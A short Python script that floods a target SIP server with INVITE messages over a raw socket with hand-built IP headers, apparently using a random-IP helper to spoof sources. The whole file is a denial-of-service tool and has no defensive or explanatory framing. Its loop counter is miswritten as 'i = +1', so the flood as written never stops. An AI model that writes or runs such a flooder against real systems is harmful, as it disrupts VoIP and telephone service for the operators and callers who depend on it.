import socket
import generatePacket
import randomIP


class SendInvite:
    @staticmethod
    def fire(target_ip):
        """Send a SIP invite to the SIP server"""
        message = "INVITE sip:bob@biloxi.com SIP/2.0\n"
        message += "Via: SIP/2.0/UDP pc33.atlanta.com;branch=z9hG4bK776asdhds\n"
        message += "Max-Forwards: 70\n"
        message += "To: Bob <sip:bob@biloxi.com>\n"
        message += "From: Alice <sip:alice@atlanta.com>;tag=1928301774\n"
        message += "Call-ID: a84b4c76e66710@pc33.atlanta.com\n"
        message += "CSeq: 314159 INVITE\n\n"
        gp = generatePacket.GeneratePacket()
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        r = randomIP.RandomIP()
        i = 0
        while i < 100000:
            s.sendto(gp.generate(message, target_ip), (target_ip, 0))
            i = +1
